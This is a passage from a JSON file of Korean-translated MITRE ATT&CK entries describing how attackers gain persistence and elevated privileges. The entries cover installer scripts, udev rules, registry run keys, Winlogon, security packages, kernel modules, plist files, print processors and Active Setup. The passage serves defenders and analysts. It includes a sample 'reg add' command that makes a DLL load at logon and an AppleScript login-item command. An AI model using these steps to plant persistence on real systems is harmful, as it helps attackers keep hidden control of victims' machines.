      "description": "공격자는 설치 프로그램을 사용하여 악성 콘텐츠의 실행을 트리거함으로써 지속성을 확립하고 권한을 상승시킬 수 있습니다. 설치 패키지는 운영 체제별로 제공되며 운영 체제가 시스템에 응용 프로그램을 설치하는 데 필요한 리소스를 포함하고 있습니다. 설치 패키지에는 설치 전에 실행되는 스크립트와 설치가 완료된 후에 실행되는 스크립트가 포함될 수 있습니다. 설치 프로그램 스크립트는 실행될 때 높은 권한을 상속받을 수 있습니다. 개발자는 종종 이러한 스크립트를 사용하여 설치를 위한 환경을 준비하고, 요구 사항을 확인하며, 종속성을 다운로드하고, 설치 후 파일을 제거합니다. (출처: 설치 패키지 스크립팅 Rich Trouton)\n\n정상 애플리케이션을 사용하여 공격자는 수정된 설치 스크립트를 포함한 애플리케이션을 배포하여 악성 콘텐츠를 실행할 수 있습니다. 사용자가 애플리케이션을 설치할 때, 설치를 허용하기 위해 관리자 권한을 부여해야 할 수도 있습니다. 정상 애플리케이션의 설치 과정이 끝나면 macOS의 `postinstall` 스크립트와 같은 콘텐츠가 상속된 높은 권한으로 실행될 수 있습니다. 공격자는 이러한 스크립트를 사용하여 악성 실행 파일을 실행하거나 높은 권한으로 다른 악성 구성 요소(예: [Launch Daemon](https://attack.mitre.org/techniques/T1543/004))를 설치할 수 있습니다. (출처: 애플리케이션 번들 조작 Brandon Dalton)(출처: wardle evilquest parti)(출처: Windows AppleJeus GReAT)(출처: Debian Manual Maintainer Scripts)\n\n배포 방식에 따라 리눅스 버전의 패키지 설치 스크립트는 때때로 유지 관리 스크립트 또는 설치 후 스크립스라고 불립니다. 이러한 스크립트에는 `preinst`, `postinst`, `prerm`, `postrm` 스크립트가 포함될 수 있으며 실행될 때 루트 권한으로 실행됩니다.\n\n윈도우의 경우, Microsoft Installer 서비스는 `.msi` 파일을 사용하여 응용 프로그램의 설치, 업데이트 및 제거를 관리합니다. 이러한 설치 루틴은 또한 공격자가 악용할 수 있는 추가 작업을 수행하는 지침을 포함할 수 있습니다. (출처: Microsoft Installation Procedures)",
      "external_id": "T1546.016",
      "modified": "2024-04-28T15:52:44.332Z",
      "title": "Installer Packages",
      "translated": true
    },
    {
      "description": "공격자는 udev 규칙을 사용하여 트리거된 악성 콘텐츠를 실행함으로써 지속성을 유지할 수 있습니다. udev는 장치 노드를 동적으로 관리하고, `/dev` 디렉터리에 있는 의사 장치 파일에 대한 접근을 처리하며, 하드 드라이브나 키보드와 같은 외부 장치가 연결되거나 분리될 때 하드웨어 이벤트에 응답하는 리눅스 커널 장치 관리자입니다. udev는 `match keys`를 사용하여 하드웨어 이벤트가 충족해야 하는 조건을 지정하고, `action keys`를 사용하여 이어져야 할 작업을 정의하는 규칙 파일을 사용합니다. `/etc/udev/rules.d/`, `/run/udev/rules.d/`, `/usr/lib/udev/rules.d/`, `/usr/local/lib/udev/rules.d/`, `/lib/udev/rules.d/`에 위치한 규칙 파일을 생성, 수정 또는 삭제하려면 루트 권한이 필요합니다. 규칙의 우선순위는 디렉터리와 규칙 파일 이름의 숫자 접두사에 의해 결정됩니다. (인용: Ignacio Udev 연구 2024) (인용: Elastic Linux Persistence 2024)\n\n공격자는 udev 규칙 파일에 규칙을 추가하거나 수정하여 udev 하위 시스템을 악용할 수 있습니다. 예를 들어, 공격자는 `/dev/random`과 같은 의사 장치 파일에 애플리케이션이 접근할 때마다 자신의 바이너리를 실행하도록 규칙을 설정할 수 있습니다. udev는 짧은 작업을 실행하는 데 제한적이며 systemd-udevd의 샌드박스에 의해 제한되지만(네트워크 및 파일 시스템 접근 차단), 공격자는 action key `RUN+=` 하의 스크립팅 명령을 사용하여 악성 콘텐츠의 프로세스를 배경에서 분리하여 실행할 수 있어 이러한 제어를 우회할 수 있습니다. (인용: Reichert aon sedexp 2024)",
      "external_id": "T1546.017",
      "modified": "2024-11-11T19:05:38.708Z",
      "title": "Udev Rules",
      "translated": true
    },
    {
      "description": "공격자는 시스템 부팅 또는 로그온 시 자동으로 프로그램을 실행하도록 시스템 설정을 구성하여 지속성을 유지하거나 손상된 시스템에서 더 높은 수준의 권한을 얻을 수 있습니다. 운영 체제는 시스템 부팅 또는 계정 로그온 시 자동으로 프로그램을 실행하는 메커니즘을 갖추고 있습니다. (출처: Microsoft Run Key)(출처: MSDN Authentication Packages)(출처: Microsoft TimeProvider)(출처: Cylance Reg Persistence Sept 2013)(출처: Linux Kernel Programming) 이러한 메커니즘에는 특별히 지정된 디렉터리에 배치된 프로그램이나 구성 정보를 저장하는 저장소(예: Windows 레지스트리)에서 참조되는 프로그램을 자동으로 실행하는 것이 포함될 수 있습니다. 공격자는 커널의 기능을 수정하거나 확장하여 같은 목표를 달성할 수 있습니다.\n\n부팅 또는 로그온 자동 시작 프로그램 중 일부는 더 높은 권한으로 실행되므로, 공격자는 이를 이용하여 권한 상승을 할 수 있습니다.",
      "external_id": "T1547",
      "modified": "2024-09-12T15:27:58.051Z",
      "title": "Boot or Logon Autostart Execution",
      "translated": true
    },
    {
      "description": "공격자는 시작 폴더에 프로그램을 추가하거나 레지스트리 실행 키를 통해 참조하여 지속성을 달성할 수 있습니다. 레지스트리의 \"run keys\"에 항목을 추가하거나 시작 폴더에 추가하면 사용자가 로그인할 때 참조된 프로그램이 실행됩니다.(인용: Microsoft Run Key) 이러한 프로그램은 사용자의 컨텍스트에서 실행되며 해당 계정의 권한 수준을 갖습니다.\n\nWindows 시스템에서는 다음과 같은 기본적으로 생성되는 실행 키가 있습니다:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\n실행 키는 여러 하이브 아래에 존재할 수 있습니다.(인용: Microsoft Wow6432Node 2018)(인용: Malwarebytes Wow6432Node 2016) <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code>도 사용 가능하지만 Windows Vista 및 이후 버전에서는 기본적으로 생성되지 않습니다. 레지스트리 실행 키 항목은 프로그램을 직접 참조하거나 의존성으로 나열할 수 있습니다.(인용: Microsoft Run Key) 예를 들어, \"Depend\" 키와 함께 RunOnceEx를 사용하여 로그인 시 DLL을 로드하는 것이 가능합니다: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (인용: Oddvar Moe RunOnceEx Mar 2018)\n\n시작 폴더에 프로그램을 배치하면 사용자가 로그인할 때 해당 프로그램이 실행됩니다. 개별 사용자 계정에 대한 시작 폴더 위치와 모든 사용자에 대해 확인되는 시스템 전역 시작 폴더가 있습니다. 현재 사용자에 대한 시작 폴더 경로는 <code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>입니다. 모든 사용자에 대한 시작 폴더 경로는 <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>입니다.\n\n지속성을 위해 시작 폴더 항목을 설정하는 데 사용할 수 있는 다음 레지스트리 키가 있습니다:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\n부팅 중 서비스의 자동 시작을 제어할 수 있는 다음 레지스트리 키가 있습니다:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\n정책 설정을 사용하여 시작 프로그램을 지정하면 두 개의 레지스트리 키 중 하나에 해당하는 값이 생성됩니다:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\n레지스트리 키 <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code>의 로드 값에 나열된 프로그램은 현재 로그인된 사용자에게 자동으로 실행됩니다.\n\n기본적으로 레지스트리 키 <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code>의 멀티 스트링 <code>BootExecute</code> 값은 <code>autocheck autochk *</code>로 설정됩니다. 이 값은 Windows가 시작할 때 시스템이 비정상 종료된 경우 하드 드라이브의 파일 시스템 무결성을 확인하도록 합니다. 공격자는 이 레지스트리 값에 다른",
      "external_id": "T1547.001",
      "modified": "2024-09-12T15:27:58.051Z",
      "title": "Registry Run Keys / Startup Folder",
      "translated": true
    },
    {
      "description": "위협 행위자는 시스템 부팅 시 DLL을 실행하기 위해 인증 패키지를 악용할 수 있습니다. Windows 인증 패키지 DLL은 시스템 시작 시 로컬 보안 권한(LSA) 프로세스에 의해 로드됩니다. 이러한 패키지는 운영 체제에 대해 여러 로그인 프로세스와 여러 보안 프로토콜을 지원합니다. (출처: MSDN 인증 패키지)\n\n위협 행위자는 LSA 인증 패키지에서 제공하는 자동 시작 메커니즘을 활용하여 지속성을 확보할 수 있습니다. 이는 Windows 레지스트리 위치 <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code>에 바이너리에 대한 참조를 배치하고, 키 값으로 <code>\"Authentication Packages\"=&lt;target binary&gt;</code>를 설정함으로써 이루어집니다. 그러면 인증 패키지가 로드될 때 시스템에 의해 해당 바이너리가 실행됩니다.",
      "external_id": "T1547.002",
      "modified": "2022-04-20T16:29:36.291Z",
      "title": "Authentication Package",
      "translated": true
    },
    {
      "description": "적대자는 시스템 부팅 시 DLL을 실행하기 위해 시간 제공자를 악용할 수 있습니다. Windows 시간 서비스(W32Time)는 도메인 내 및 간의 시간 동기화를 가능하게 합니다.(인용: Microsoft W32Time 2018년 2월) W32Time 시간 제공자는 하드웨어/네트워크 리소스에서 타임스탬프를 검색하고 이러한 값을 다른 네트워크 클라이언트에 출력하는 역할을 합니다.(인용: Microsoft TimeProvider)\n\n시간 제공자는 `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\`의 하위 키에 등록된 동적 링크 라이브러리(DLL)로 구현됩니다.(인용: Microsoft TimeProvider) 서비스 제어 관리자의 지시에 따라 시간 제공자 관리자 는 시스템 시작 시 및/또는 매개변수가 변경될 때 이 키 아래 나열되고 활성화된 시간 제공자를 로드하고 시작합니다.(인용: Microsoft TimeProvider)\n\n적대자는 이 아키텍처를 악용하여 지속성을 확립할 수 있으며, 특히 `DllName` 값에서 악성 DLL을 가리키는 새로운 임의 이름의 하위 키를 생성함으로써 가능합니다. 시간 제공자 등록에는 관리자 권한이 필요하지만, 실행은 로컬 서비스 계정의 컨텍스트에서 수행됩니다.(인용: Github W32Time 2017년 10월)",
      "external_id": "T1547.003",
      "modified": "2024-04-12T02:34:58.003Z",
      "title": "Time Providers",
      "translated": true
    },
    {
      "description": "위협 행위자들은 사용자가 로그인할 때 DLL 및/또는 실행 파일을 실행하기 위해 Winlogon의 기능을 악용할 수 있습니다. Winlogon.exe는 로그인/로그오프 시 수행되는 작업과 Ctrl-Alt-Delete에 의해 트리거되는 안전 주의 시퀀스(SAS)를 담당하는 Windows 구성 요소입니다. <code>HKLM\\Software[\\\\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> 및 <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code>의 레지스트리 항목은 Winlogon을 지원하는 추가 도우미 프로그램 및 기능을 관리하는 데 사용됩니다. (출처: Cylance Reg Persistence Sept 2013)\n\n이러한 레지스트리 키에 대한 악의적인 수정은 Winlogon이 악성 DLL 및/또는 실행 파일을 로드하고 실행하도록 할 수 있습니다. 특히, 다음 하위 키는 악용될 가능성이 있는 것으로 알려져 있습니다: (출처: Cylance Reg Persistence Sept 2013)\n\n* Winlogon\\Notify - Winlogon 이벤트를 처리하는 알림 패키지 DLL을 가리킴\n* Winlogon\\Userinit - 사용자가 로그인할 때 실행되는 사용자 초기화 프로그램인 userinit.exe를 가리킴\n* Winlogon\\Shell - 사용자가 로그인할 때 실행되는 시스템 셸인 explorer.exe를 가리킴\n\n위협 행위자들은 이러한 기능을 이용하여 악성 코드를 반복적으로 실행하고 지속성을 확립할 수 있습니다.",
      "external_id": "T1547.004",
      "modified": "2024-02-14T21:24:37.780Z",
      "title": "Winlogon Helper DLL",
      "translated": true
    },
    {
      "description": "공격자는 시스템 부팅 시 DLL을 실행하기 위해 보안 지원 공급자(SSP)를 악용할 수 있습니다. Windows SSP DLL은 시스템 시작 시 로컬 보안 권한(LSA) 프로세스에 로드됩니다. LSA에 로드된 후, SSP DLL은 Windows에 저장된 암호화된 비밀번호와 일반 텍스트 비밀번호에 접근할 수 있으며, 이는 로그인된 사용자의 도메인 비밀번호나 스마트 카드 PIN을 포함합니다.\n\nSSP 구성은 두 개의 레지스트리 키에 저장됩니다: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> 및 <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. 공격자는 이러한 레지스트리 키를 수정하여 새로운 SSP를 추가할 수 있으며, 이는 시스템이 다음 번에 부팅될 때 로드되거나 AddSecurityPackage Windows API 기능이 호출될 때 로드됩니다.(인용: Graeber 2014)",
      "external_id": "T1547.005",
      "modified": "2020-03-25T15:42:48.910Z",
      "title": "Security Support Provider",
      "translated": true
    },
    {
      "description": "공격자는 시스템 부팅 시 자동으로 프로그램을 실행하기 위해 커널을 수정할 수 있습니다. 로드 가능한 커널 모듈(Loadable Kernel Modules, LKM)은 필요에 따라 커널에 로드되고 언로드될 수 있는 코드 조각입니다. 이들은 시스템을 재부팅할 필요 없이 커널의 기능을 확장합니다. 예를 들어, 장치 드라이버는 커널이 시스템에 연결된 하드웨어에 접근할 수 있게 해주는 모듈의 한 종류입니다.\n\n악의적으로 사용될 경우, LKM은 가장 높은 운영 체제 권한(Ring 0)으로 실행되는 커널 모드 루트킷의 일종이 될 수 있습니다. LKM 기반 루트킷의 일반적인 특징은 스스로를 숨기고, 파일, 프로세스 및 네트워크 활동을 선별적으로 숨기는 것, 로그 변조, 인증된 백도어 제공, 비특권 사용자에게 루트 접근 권한을 부여하는 것입니다.\n\nmacOS에서는 커널 확장(kernel extension)이라고도 불리는 kext를 이용해 시스템에 기능을 로드합니다. Linux의 LKM과 유사합니다. 커널이 보안을 시행하는 역할을 하며, 커널 확장은 커널의 일부로 실행되기 때문에, kext는 macOS 보안 정책의 적용을 받지 않습니다. kext는 <code>kextload</code> 및 <code>kextunload</code> 명령어를 통해 로드 및 언로드됩니다. kext는 Apple이 커널 확명서를 서명할 수 있는 권한을 부여한 개발자 ID로 서명해야 합니다. 이러한 권한이 없는 개발자는 kext를 여전히 서명할 수 있지만, SIP(시스템 무결성 보호)가 비활성화되지 않는 한 로드되지 않습니다. SIP가 활성화되면, kext의 서명이 AuxKC에 추가되기 전에 확인됩니다.\n\nmacOS Catalina 10.15부터는 커널 확장이 시스템 확장(System Extensions)으로 대체되었습니다. 그러나 커널 프로그래밍 인터페이스에 대한 시스템 확장이 없으므로 kext는 여전히 \"구형 시스템 확장(Legacy System Extensions)\"으로 허용됩니다.\n\n공격자는 LKM 및 kext를 사용하여 시스템에서 지속성(Persistence) 및/또는 권한 상승(Privilege Escalation)을 수행할 수 있습니다. 실제 사례가 발견되었으며, 관련된 오픈 소스 프로젝트도 일부 존재합니다.",
      "external_id": "T1547.006",
      "modified": "2024-09-12T17:30:54.170Z",
      "title": "Kernel Modules and Extensions",
      "translated": true
    },
    {
      "description": "적대적인 행위자는 plist 파일을 수정하여 사용자가 로그인할 때 애플리케이션이 자동으로 실행되도록 할 수 있습니다. 사용자가 macOS 그래픽 사용자 인터페이스(GUI)를 통해 로그아웃하거나 재부팅할 때, 사용자는 \"다시 로그인할 때 창 다시 열기\"라는 체크박스가 있는 프롬프트를 받게 됩니다. (출처: Mac에서 창 다시 열기) 이 옵션이 선택되면 현재 열려 있는 모든 애플리케이션은 <code>com.apple.loginwindow.[UUID].plist</code>라는 속성 목록 파일에 추가됩니다. 이 파일은 <code>~/Library/Preferences/ByHost</code> 디렉터리 내에 위치합니다. (출처: Mac 악성코드 지속성 방법)(출처: Wardle 지속성 장) 이 파일에 나열된 애플리케이션은 사용자가 다음 로그인할 때 자동으로 다시 열립니다.\n\n적대적인 행위자는 <code>com.apple.loginwindow.[UUID].plist</code> 파일에 악성 애플리케이션 경로를 추가함으로써 [지속성](https://attack.mitre.org/tactics/TA0003)을 설정하여 사용자가 로그인할 때 페이로드를 실행할 수 있습니다.",
      "external_id": "T1547.007",
      "modified": "2022-04-19T23:46:56.443Z",
      "title": "Re-opened Applications",
      "translated": true
    },
    {
      "description": "공격자는 손상된 시스템에서 지속성을 확보하기 위해 LSASS 드라이버를 수정하거나 추가할 수 있습니다. Windows 보안 하위 시스템은 컴퓨터나 도메인에 대한 보안 정책을 관리하고 집행하는 구성 요소 집합입니다. 로컬 보안 기관(LSA)은 로컬 보안 정책 및 사용자 인증을 담당하는 주요 구성 요소입니다. LSA는 다양한 보안 기능과 관련된 여러 동적 연결 라이브러리(DLL)를 포함하고 있으며, 이 모든 것은 LSA 하위 시스템 서비스(LSASS)인 lsass.exe 프로세스의 컨텍스트에서 실행됩니다. (출처: Microsoft Security Subsystem)\n\n공격자는 LSASS 드라이버를 목표로 하여 지속성을 얻을 수 있습니다. 불법 드라이버를 교체하거나 추가함으로써 (예: [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), 공격자는 LSA 작업을 사용하여 지속적으로 악성 페이로드를 실행할 수 있습니다.",
      "external_id": "T1547.008",
      "modified": "2022-04-20T16:34:43.405Z",
      "title": "LSASS Driver",
      "translated": true
    },
    {
      "description": "공격자는 시스템 부팅이나 사용자 로그인의 과정에서 프로그램을 실행할 수 있는 바로 가기를 생성하거나 수정할 수 있습니다. 바로 가기 또는 심볼릭 링크는 다른 파일이나 프로그램을 참조하는 데 사용되며, 사용자가 바로 가기를 클릭하거나 시스템 시작 프로세스에서 실행할 때 열리거나 실행됩니다.\n\n공격자는 시작 폴더에 있는 바로 가기를 악용하여 자신의 도구를 실행하고 지속성을 확보할 수 있습니다. (출처: 지속성을 위한 바로 가기) 종종 감염 체인의 페이로드로 사용되지만 (예: [피싱 첨부파일](https://attack.mitre.org/techniques/T1566/001)), 공격자는 새로운 바로 가기를 생성하여 대리로 사용하면서 [미화](https://attack.mitre.org/techniques/T1036)를 악용하여 악성 바로 가기가 합법적인 프로그램처럼 보이도록 할 수 있습니다. 또한 공격자는 대상 경로를 편집하거나 기존의 바로 가기를 완전히 대체하여 자신의 악성코드가 의도한 합법적인 프로그램 대신 실행되도록 할 수 있습니다.\n\n바로 가기는 다른 방법을 구현하여 지속성을 확보하는 데도 악용될 수 있습니다. 예를 들어, LNK 브라우저 확장 프로그램이 수정되어 (예: [브라우저 확장 프로그램](https://attack.mitre.org/techniques/T1176)) 지속적으로 악성코드를 실행할 수 있습니다.",
      "external_id": "T1547.009",
      "modified": "2024-10-15T13:41:16.110Z",
      "title": "Shortcut Modification",
      "translated": true
    },
    {
      "description": "공격자는 시스템 부팅 시 지속성(persistence) 또는 권한 상승(privilege escalation)을 위해 공격자가 제공한 DLL을 실행하기 위해 포트 모니터를 사용할 수 있습니다. 포트 모니터는 <code>AddMonitor</code> API 호출을 통해 설정할 수 있으며, 이를 통해 부팅 시 로드될 DLL을 설정할 수 있습니다. (출처: AddMonitor) 이 DLL은 <code>C:\\Windows\\System32</code>에 위치할 수 있으며, 부팅 시 SYSTEM 수준의 권한으로 인쇄 대기열 서비스인 `spoolsv.exe`에 의해 로드되고 실행됩니다. (출처: Bloxham)\n\n기타 방법으로는, 권한이 허용되는 경우 기존 또는 새로 만들어진 임의의 이름을 가진 하위 키의 `Driver` 값에 대해 해당 DLL의 완전 자격 경로를 쓸 수 있습니다. 이는 <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>의 레지스트리 키에서 이루어집니다. 해당 레지스트리 키에는 다음과 같은 항목이 포함되어 있습니다:\n\n* 로컬 포트\n* 표준 TCP/IP 포트\n* USB 모니터\n* WSD 포트",
      "external_id": "T1547.010",
      "modified": "2024-09-12T15:26:17.886Z",
      "title": "Port Monitors",
      "translated": true
    },
    {
      "description": "공격자는 지속성을 확보하는 일환으로 plist 파일(속성 목록 파일)을 수정하여 자신의 코드를 실행할 수 있습니다. plist 파일은 macOS 애플리케이션이 애플리케이션 및 서비스의 속성과 구성 설정을 저장하는 데 사용됩니다. 애플리케이션은 정보 plist 파일인 <code>Info.plist</code>를 사용하여 애플리케이션을 실행할 때 운영 체제가 애플리케이션을 어떻게 처리해야 하는지를 구조화된 메타데이터 형태의 키와 값으로 알려줍니다. plist 파일은 XML 형식으로 포맷되어 있으며, Apple의 Core Foundation DTD에 기반하고 있으며, 텍스트 또는 이진 형식으로 저장될 수 있습니다. (출처: fileinfo plist 파일 설명)\n\n공격자는 실행되는 이진 파일의 경로를 수정하고, 명령 줄 인수를 추가하며, 사용자 로그온 또는 시스템 시작 시 실행되는 자동 실행 위치의 plist 파일에 키-값 쌍을 삽입할 수 있습니다. 이러한 위치의 plist 파일을 수정함으로써 공격자는 <code>DYLD_INSERT_LIBRARIES</code> 키와 악성 dylib에 대한 경로가 포함된 사전을 <code>EnvironmentVariables</code> 키 아래에 추가하여 악성 동적 라이브러리(dylib)를 실행할 수 있습니다. 사용자 로그온 시 plist가 호출되어 악성 dylib가 프로세스 공간 내에서 실행됩니다. 또한, 애플리케이션의 <code>Info.plist</code> 파일에서 <code>LSEnvironment</code> 키를 수정하여 지속성을 확보할 수 있습니다. (출처: wardle artofmilware volume1)",
      "external_id": "T1547.011",
      "modified": "2022-04-20T21:06:07.560Z",
      "title": "Plist Modification",
      "translated": true
    },
    {
      "description": "위협 행위자는 시스템 부팅 중에 악성 DLL을 실행하여 지속성과 권한 상승을 위해 프린트 프로세서를 악용할 수 있습니다. 프린트 프로세서는 부팅 시 `spoolsv.exe`라는 프린트 스풀러 서비스에 의해 로드되는 DLL입니다. (출처: Microsoft Intro Print Processors)\n\n위협 행위자는 프린트 스풀러 서비스에 악성 DLL을 로드하는 프린트 프로세서를 추가하여 이를 악용할 수 있습니다. 프린트 프로세서는 `SeLoadDriverPrivilege`가 활성화된 계정을 통해 `<code>AddPrintProcessor</code>` API 호출을 사용하여 설치할 수 있습니다. 대안으로, 프린트 프로세서는 다음과 같은 레지스트리 키를 추가하여 프린트 스풀러 서비스에 등록될 수 있습니다: `<code>HKLM\\SYSTEM\\\\[CurrentControlSet 또는 ControlSet001]\\Control\\Print\\Environments\\\\[Windows 아키텍처: 예: Windows x64]\\Print Processors\\\\[사용자 정의]\\Driver</code>` 이 키는 DLL을 가리킵니다.\n\n악성 프린트 프로세서가 올바르게 설치되려면 페이로드가 전용 시스템 프린트 프로세서 디렉토리에 위치해야 하며, 이는 `<code>GetPrintProcessorDirectory</code>` API 호출을 통해 찾을 수 있거나 이 디렉토리에서 상대 경로로 참조될 수 있습니다. (출처: Microsoft AddPrintProcessor May 2018) 프린트 프로세서가 설치된 후, 부팅 중에 시작되는 프린트 스풀러 서비스는 이들이 실행되도록 하려면 재시작해야 합니다. (출처: ESET PipeMon May 2020)\n\n프린트 스풀러 서비스는 SYSTEM 수준의 권한으로 실행되므로, 위협 행위자가 설치한 프린트 프로세서는 상승된 권한으로 실행될 수 있습니다.",
      "external_id": "T1547.012",
      "modified": "2023-10-04T14:16:17.655Z",
      "title": "Print Processors",
      "translated": true
    },
    {
      "description": "공격자는 사용자의 데스크탑 환경이 로그인 시 로드될 때 악성 프로그램이나 명령을 실행하기 위해 XDG Autostart 항목을 추가하거나 수정할 수 있습니다. XDG Autostart 항목은 모든 XDG 호환 리눅스 시스템에서 사용할 수 있습니다. XDG Autostart 항목은 `.desktop` 파일을 사용하여 사용자가 로그인할 때 사용자 데스크탑 환경을 구성합니다. 이러한 구성 파일은 사용자가 로그인할 때 어떤 응용 프로그램이 실행될지를 결정하고, 특정 파일 형식을 열기 위해 연결된 응용 프로그램을 정의하며, 외부 미디어를 여는 데 사용되는 응용 프로그램을 정의합니다. (인용: Free Desktop Application Autostart 2006년 2월)(인용: Free Desktop Entry Keys)\n\n공격자는 `.desktop` 구성 파일의 `Exec` 지시문에 악성 이진 파일 또는 명령의 경로를 추가하여 지속성을 확보하기 위해 이 기능을 악용할 수 있습니다. 사용자의 데스크탑 환경이 로그인 시 로드될 때 XDG Autostart 디렉토리에 있는 `.desktop` 파일이 자동으로 실행됩니다. 시스템 전체에 적용되는 Autostart 항목은 `/etc/xdg/autostart` 디렉토리에 위치하고, 사용자 항목은 `~/.config/autostart` 디렉토리에 위치합니다.\n\n공격자는 이 기술을 [위장(조작)](https://attack.mitre.org/techniques/T1036)과 결합하여 악성 Autostart 항목을 합법적인 프로그램과 혼합할 수 있습니다. (인용: Red Canary Netwire Linux 2022)",
      "external_id": "T1547.013",
      "modified": "2023-10-16T16:35:12.501Z",
      "title": "XDG Autostart Entries",
      "translated": true
    },
    {
      "description": "적대 세력은 로컬 머신의 Active Setup에 레지스트리 키를 추가하여 지속성을 유지할 수 있습니다. Active Setup은 사용자가 로그인할 때 프로그램을 실행하기 위해 Windows에서 사용되는 메커니즘입니다. 레지스트리 키에 저장된 값은 사용자가 컴퓨터에 로그인한 후 실행됩니다. (참조: Klein Active Setup 2010) 이러한 프로그램은 사용자 컨텍스트에서 실행되며, 해당 계정의 권한 수준으로 실행됩니다.\n\n적대 세력은 <code> HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code> 하에 키를 생성하고 <code>StubPath</code>에 악성 값을 설정함으로써 Active Setup을 악용할 수 있습니다. 이 값은 사용자가 컴퓨터에 로그인할 때 실행될 프로그램 역할을 합니다. (참조: Mandiant Glyer APT 2010)(참조: Citizenlab Packrat 2015)(참조: FireEye CFR Watering Hole 2012)(참조: SECURELIST Bright Star 2015)(참조: paloalto Tropic Trooper 2016)\n\n적대 세력은 이러한 구성 요소를 악용하여 원격 접근 도구와 같은 악성 코드를 실행하고 시스템 재부팅을 통해 지속성을 유지할 수 있습니다. 또한, 적대 세력은 [변장 기법](https://attack.mitre.org/techniques/T1036)을 사용하여 레지스트리 항목이 합법적인 프로그램과 연결된 것처럼 보이게 만들 수 있습니다.",
      "external_id": "T1547.014",
      "modified": "2023-03-22T14:17:17.353Z",
      "title": "Active Setup",
      "translated": true
    },
    {
      "description": "공격자는 사용자가 로그인할 때 실행되도록 로그인 항목을 추가하여 지속성을 유지하거나 권한을 상승시킬 수 있습니다. 로그인 항목은 사용자가 로그인할 때 자동으로 시작되는 응용 프로그램, 문서, 폴더 또는 서버 연결입니다. 로그인 항목은 공유 파일 목록 또는 서비스 관리 프레임워크를 통해 추가할 수 있습니다. 공유 파일 목록의 로그인 항목은 [AppleScript](https://attack.mitre.org/techniques/T1059/002)와 같은 스크립팅 언어를 사용하여 설정할 수 있으며, 서비스 관리 프레임워크는 API 호출 <code>SMLoginItemSetEnabled</code>를 사용합니다.\n\n서비스 관리 프레임워크를 사용하여 설치된 로그인 항목은 <code>launchd</code>를 활용하며, 시스템 환경 설정에서 볼 수 없고 이를 생성한 응용 프로그램만 제거할 수 있습니다. 공유 파일 목록을 사용하여 생성된 로그인 항목은 시스템 환경 설정에서 볼 수 있으며, 실행 시 응용 프로그램을 숨길 수 있고, Finder를 사용하지 않고도 애플리케이션, 문서 또는 URL을 열기 위해 LaunchServices를 통해 실행됩니다. 사용자와 응용 프로그램은 로그인 항목을 사용하여 이메일, 채팅 및 음악 응용 프로그램과 같은 일반적으로 사용되는 서비스나 애플리케이션을 실행하도록 사용자 환경을 구성합니다.\n\n공격자는 [AppleScript](https://attack.mitre.org/techniques/T1059/002) 및 [Native API](https://attack.mitre.org/techniques/T1106) 호출을 활용하여 악성 실행 파일을 생성하는 로그인 항목을 만들 수 있습니다. macOS 10.5 이전 버전에서는 공격자가 Apple 이벤트를 “시스템 이벤트” 프로세스에 보내 로그인 항목을 추가할 수 있습니다. 이는 로그인 항목을 조작하기 위한 AppleScript 사전이 있습니다. 공격자는 <code>tell application “System Events” to make login item at end with properties /path/to/executable</code>와 같은 명령을 사용할 수 있습니다. 이 명령은 악성 실행 파일의 경로를 <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>에 있는 로그인 항목 파일 목록에 추가합니다. 공격자는 로그인 항목을 사용하여 피해 시스템을 원격으로 제어하거나 사용자 자격 증명을 요구하여 권한 상승을 획득할 수 있는 실행 파일을 실행할 수도 있습니다.",
      "external_id": "T1547.015",
